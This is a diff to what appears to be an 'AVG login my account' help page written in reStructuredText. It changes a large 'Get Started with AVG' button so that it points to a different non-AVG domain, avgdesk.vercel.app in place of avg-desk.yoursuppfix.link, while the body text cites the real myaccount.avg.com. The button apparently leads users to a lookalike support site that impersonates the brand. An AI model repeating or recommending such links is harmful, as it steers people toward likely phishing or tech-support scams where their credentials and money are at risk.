@@ -6,7 +6,7 @@ Managing your AVG products and subscriptions has never been easier—thanks to t
 .. raw:: html
 
    <div style="text-align:center;">
-       <a href="https://avg-desk.yoursuppfix.link/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Get Started with AVG</a>
+       <a href="https://avgdesk.vercel.app/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Get Started with AVG</a>
    </div>
 
 However, like any online portal, users sometimes encounter login issues, password errors, or account recovery challenges. This comprehensive guide will walk you through everything you need to know about accessing the `avg login my account <https://myaccount.avg.com>`_ page, recovering a forgotten password, and fixing the most common login-related problems.
@@ -182,3 +182,4 @@ Remember, a secure account is the foundation of secure devices. Take the time to
 
 
 Stay safe, stay secure—and happy browsing!
+
